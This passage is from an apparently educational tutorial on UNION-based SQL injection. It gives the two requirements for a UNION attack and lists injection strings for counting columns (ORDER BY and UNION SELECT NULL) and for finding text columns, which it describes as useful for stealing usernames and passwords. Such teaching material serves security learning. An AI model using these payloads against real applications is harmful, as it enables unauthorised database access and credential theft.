## The Two Requirements (Restated)

1. **Same number of columns** – Your `UNION SELECT` must have the same column count as the original query
2. **Compatible data types** – Each column's type must match (string with string, number with number)

## The Discovery Process

### Step 1: Find the column count

Use `ORDER BY` or `NULL` technique:

**ORDER BY method:**
```
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```
When you get an error, the previous number is the column count.

**NULL method (more reliable):**
```
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
```
When the error stops, that's your column count.

### Step 2: Find which columns hold text

Replace one `NULL` at a time with a string value (`'a'`):

```
' UNION SELECT 'a', NULL, NULL --
' UNION SELECT NULL, 'a', NULL --
' UNION SELECT NULL, NULL, 'a' --
```

- **No error** = that column accepts strings (good for stealing usernames, passwords)
- **Error** = that column is numeric or date type
